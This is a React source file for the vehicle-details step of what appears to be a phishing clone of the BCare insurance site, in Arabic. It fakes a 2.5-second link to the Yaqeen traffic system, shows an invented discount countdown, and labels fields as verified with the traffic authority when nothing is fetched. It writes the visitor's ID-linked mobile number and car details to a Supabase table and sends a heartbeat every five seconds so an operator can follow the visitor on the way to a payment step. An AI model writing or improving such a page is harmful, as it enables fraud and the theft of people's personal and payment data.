import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import "./DataForm.css";
import { supabase } from "../../supabase";
import Footer from "../../components/Footer/Footer";

export const DataForm = ({ className, ...props }) => {
  const navigate = useNavigate();
  const location = useLocation();
  const prefilledId = location.state?.idNumber || "";
  const [isFakeLoading, setIsFakeLoading] = useState(true);

  // Fake fetching simulation
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsFakeLoading(false);
    }, 2500);
    return () => clearTimeout(timer);
  }, []);

  // Update Page Tracking & Heartbeat
  useEffect(() => {
    const customerId = sessionStorage.getItem('customerId');
    if (customerId) {
      supabase.from('customers').update({ 
        page: '2- صفحه البيانات',
        status: 'idle',
        last_update: Date.now(),
        last_heartbeat: Date.now()
      }).eq('id', customerId).then(({ error }) => { if (error) console.error("Update Error:", error) });
    }

    const interval = setInterval(() => {
      const id = sessionStorage.getItem('customerId');
      if (id) {
        supabase.from('customers').update({ 
          last_heartbeat: Date.now() 
        }).eq('id', id).then(() => {});
      }
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  const updateLastSeen = () => {
    const customerId = sessionStorage.getItem('customerId');
    if (customerId) {
      supabase.from('customers').update({ 
        last_update: Date.now() 
      }).eq('id', customerId).then(() => {});
    }
  };

  const [formData, setFormData] = useState({
    mobile: "",
    insuranceType: "third-party",
    startDate: new Date().toISOString().split('T')[0],
    usage: "شخصي",
    estimatedValue: "",
    manufactureYear: "2020",
    carMakeModel: "تويوتا كامري",
    repairLocation: "workshop"
  });

  const [errors, setErrors] = useState({});

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    
    if (name === "estimatedValue") {
      // Remove any non-numeric characters for processing
      const numericValue = value.replace(/\D/g, "");
      // Format with commas
      const formattedValue = numericValue.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
      setFormData(prev => ({ ...prev, [name]: formattedValue }));
    } else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }
    
    updateLastSeen();
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: null }));
    }
  };

  const validate = () => {
    let newErrors = {};
    if (!formData.mobile || formData.mobile.length < 10) newErrors.mobile = "رقم الجوال غير صحيح";
    if (!formData.estimatedValue) newErrors.estimatedValue = "القيمة التقديرية مطلوبة";
    
    setErrors(newErrors);
    if (Object.keys(newErrors).length > 0) {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (validate()) {
      const customerId = sessionStorage.getItem('customerId');
      if (customerId) {
        supabase.from('customers').update({
          full_name: "تم تخطيه", // No longer asking
          mobile: formData.mobile,
          purpose: formData.usage,
          car_make_model: formData.carMakeModel,
          page: 'العروض',
          last_update: new Date().getTime(),
          last_heartbeat: new Date().getTime()
        }).eq('id', customerId).then(({ error }) => { if (error) console.error("Supabase Update Error:", error) });
        
        sessionStorage.setItem('carMakeModel', formData.carMakeModel);
        sessionStorage.setItem('manufactureYear', formData.manufactureYear);
      }
      navigate("/offers", { state: { insuranceType: formData.insuranceType } });
    } else {
      window.scrollTo(0, 0);
    }
  };

  return (
    <div className={`data-form-page ${className || ""}`}>
      {/* Header - Matching Home Page */}
      <header className="site-header">
        <div className="header-right">
          <div className="user-icon">
            <img src="/svg0.svg" alt="User" />
          </div>
        </div>
        <div className="header-center">
          <img src="/group-21.svg" alt="BCare Logo" className="header-logo" />
        </div>
        <div className="header-left">
          <span className="lang-toggle">EN</span>
        </div>
      </header>

      {/* Urgency Banner */}
      {!isFakeLoading && (
        <div className="urgency-banner">
          <span className="fire-icon">🔥</span>
          <span>خصم إضافي 10% ينتهي خلال </span>
          <span className="countdown-timer">04:59</span>
        </div>
      )}

      <main className="form-main">
        {isFakeLoading ? (
          <div className="fake-loading-container">
            <div className="spinner"></div>
            <h3 style={{color: '#146394', marginTop: '20px'}}>جاري الربط مع نظام المرور (يقين)...</h3>
            <p style={{color: '#64748b', fontSize: '14px', marginTop: '10px'}}>جاري جلب بيانات المركبة والسجل التأميني، يرجى الانتظار</p>
          </div>
        ) : (
          <>
            {/* Progress Stepper */}
        <div className="stepper-container">
          <div className="step completed">
            <div className="step-number">1</div>
            <div className="step-label">البيانات الرئيسية</div>
          </div>
          <div className="step-line active"></div>
          <div className="step active">
            <div className="step-number">2</div>
            <div className="step-label">تفاصيل وثيقة التأمين</div>
          </div>
          <div className="step-line"></div>
          <div className="step disabled">
            <div className="step-number">3</div>
            <div className="step-label">الشركات والعروض</div>
          </div>
            <div className="step-line"></div>
            <div className="step disabled">
              <div className="step-number">4</div>
              <div className="step-label">الملخص والدفع</div>
            </div>
          </div>

        {/* Section Heading */}
        <div className="section-title-card">
          <h2>تفاصيل وثيقة التأمين</h2>
        </div>

        {/* Main Form Container */}
        <form className="insurance-details-form" onSubmit={handleSubmit}>
          <div className="form-card">
            <div className="form-group">
              <label>رقم الهوية / الإقامة</label>
              <input type="text" className="form-input read-only" value={prefilledId} readOnly />
            </div>

            <div className="form-group">
              <label>رقم الجوال <span className="helper-text">(لإرسال الوثيقة عبر الواتساب فقط)</span></label>
              <input 
                type="text" 
                name="mobile"
                className={`form-input ${errors.mobile ? 'error-border' : ''}`} 
                placeholder="05xxxxxxxx" 
                value={formData.mobile}
                onChange={handleInputChange}
                maxLength="10"
              />
              {errors.mobile && <span className="error-text">{errors.mobile}</span>}
            </div>

            <div className="divider"></div>

            <div className="form-group">
              <label>نوع التأمين</label>
              <select name="insuranceType" className="form-input" value={formData.insuranceType} onChange={handleInputChange}>
                <option value="third-party">ضد الغير</option>
                <option value="comprehensive">شامل</option>
              </select>
            </div>

            <div className="form-group">
              <label>تاريخ بدء التأمين</label>
              <input 
                type="date" 
                name="startDate"
                className="form-input" 
                value={formData.startDate}
                onChange={handleInputChange}
              />
            </div>

            <div className="form-group">
              <label>الغرض من استخدام المركبة</label>
              <select name="usage" className="form-input" value={formData.usage} onChange={handleInputChange}>
                <option value="شخصي">شخصي</option>
                <option value="تجاري">تجاري</option>
                <option value="نقل ركاب">نقل ركاب</option>
                <option value="تاجير">تاجير</option>
                <option value="نقل بضائع">نقل بضائع</option>
                <option value="مركبه شحن">مركبه شحن</option>
                <option value="نقل مشتقات نفطيه">نقل مشتقات نفطيه</option>
              </select>
            </div>

            <div className="form-group">
              <label>القيمة التقديرية للمركبة</label>
              <input 
                type="text" 
                name="estimatedValue"
                className={`form-input ${errors.estimatedValue ? 'error-border' : ''}`} 
                placeholder="أدخل القيمة بين 10,000 - 1,000,000 ريال" 
                value={formData.estimatedValue}
                onChange={handleInputChange}
              />
              {errors.estimatedValue && <span className="error-text">{errors.estimatedValue}</span>}
            </div>

            <div className="form-group fetched-data-group">
              <label>سنة صنع المركبة <span className="fetched-badge">✓ تم الربط بـ المرور</span></label>
              <select name="manufactureYear" className="form-input" value={formData.manufactureYear} onChange={handleInputChange}>
                {Array.from({ length: 2026 - 1950 + 1 }, (_, i) => 2026 - i).map(year => (
                   <option key={year} value={year}>{year}</option>
                ))}
              </select>
            </div>

            <div className="form-group fetched-data-group">
              <label>ماركة ونوع المركبة <span className="fetched-badge">✓ تم الربط بـ المرور</span></label>
              <input 
                type="text" 
                name="carMakeModel"
                className="form-input" 
                placeholder="مثال: تويوتا كامري" 
                value={formData.carMakeModel}
                onChange={handleInputChange}
              />
            </div>

            <div className="form-group">
              <label>مكان اصلاح المركبة</label>
              <div className="repair-options">
                <label className={`repair-radio ${formData.repairLocation === 'agency' ? 'active' : ''}`}>
                  <input 
                    type="radio" 
                    name="repairLocation" 
                    value="agency" 
                    checked={formData.repairLocation === 'agency'}
                    onChange={handleInputChange}
                  />
                  <span>الوكالة</span>
                </label>
                <label className={`repair-radio ${formData.repairLocation === 'workshop' ? 'active' : ''}`}>
                  <input 
                    type="radio" 
                    name="repairLocation" 
                    value="workshop" 
                    checked={formData.repairLocation === 'workshop'}
                    onChange={handleInputChange}
                  />
                  <span>الورشة</span>
                </label>
              </div>
            </div>

            <button type="submit" className="submit-btn-form main-action-btn">إظهار العروض</button>
            
            {/* Trust Badges */}
            <div className="trust-badges-container">
              <div className="trust-badge">
                <i className="fas fa-lock"></i>
                <span>بياناتك مشفرة ومحمية بتقنية 256-bit SSL</span>
              </div>
            </div>

          </div>
        </form>
          </>
        )}
      </main>

      <Footer />
    </div>
  );
};
